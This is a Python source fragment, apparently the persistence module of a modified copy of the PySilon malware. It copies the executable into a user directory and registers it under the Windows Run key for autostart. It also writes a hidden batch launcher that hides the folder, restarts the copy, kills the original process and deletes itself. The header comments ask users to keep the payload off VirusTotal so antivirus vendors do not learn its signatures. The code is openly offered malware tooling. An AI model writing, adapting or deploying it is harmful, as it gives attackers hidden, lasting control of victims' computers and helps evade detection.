#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS
#PLEASE DO NOT ADD PAYLOAD ON VIRUSTOTAL ( it shares signatures with other av companies )


from shutil import copy2, rmtree
import winreg
import sys
import os
# end of imports

# !registry_implosion
registry = winreg.ConnectRegistry(None, regbase)
winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
registry_key = winreg.OpenKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
winreg.DeleteValue(registry_key, software_registry_name)

# !registry
if IsAdmin():
    regbase = winreg.HKEY_LOCAL_MACHINE
else:
    regbase = winreg.HKEY_CURRENT_USER

if sys.argv[0].lower() != f'c:\\users\\{getuser()}\\{software_directory_name.lower()}\\{software_executable_name.lower()}' and not os.path.exists(f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}'):
    try:
        os.mkdir(f'C:\\Users\\{getuser()}\\{software_directory_name}')
        # Répertoire créé avec succès
    except:
        pass

    copy2(sys.argv[0], f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}')
    # Le fichier a été copié dans le répertoire utilisateur

    registry = winreg.ConnectRegistry(None, regbase)
    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    winreg.CreateKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    registry_key = winreg.OpenKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
    winreg.SetValueEx(registry_key, software_registry_name, 0, winreg.REG_SZ, f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}')
    # Ajout de l'entrée dans le registre pour démarrer au lancement
    winreg.CloseKey(registry_key)

    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', 'w', encoding='utf-8') as activator:
        process_name = sys.argv[0].split('\\')[-1]
        attrib_value = "attrib +s +h ." if IsAdmin() else "attrib +h ."
        activator.write(f'pushd "C:\\Users\\{getuser()}\\{software_directory_name}"\n{attrib_value}\nstart "" "{software_executable_name}"\ntaskkill /f /im "{process_name}"\ndel "%~f0"')
        # Script d'activation généré

    subprocess.Popen(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', creationflags=subprocess.CREATE_NO_WINDOW)
    # Exécution du script d'activation

    sys.exit(0)

#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS
#PLEASE DO NOT ADD PAYLOAD ON VIRUSTOTAL ( it shares signatures with other av companies )
